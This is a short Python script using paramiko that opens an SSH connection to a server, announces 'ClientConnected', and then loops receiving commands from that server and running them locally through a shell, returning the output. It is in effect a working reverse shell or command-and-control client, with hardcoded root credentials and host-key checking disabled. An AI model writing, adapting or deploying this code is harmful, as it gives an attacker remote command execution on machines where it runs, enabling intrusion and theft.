import paramiko
import subprocess


def ssh_command(ip,user,passwd,command):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=passwd)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode("utf8"))

        while True: # receive command from server and execute locally
            command=ssh_session.recv(1024).decode("utf8")
            try:
                output=subprocess.Popen(command,stderr=subprocess.STDOUT,stdout=subprocess.PIPE,shell=True).stdout.read()
                ssh_session.send(output)
            except Exception as e:
                ssh_session.send(str(e))
    client.close()


ssh_command("127.0.0.1","root","toor","ClientConnected")



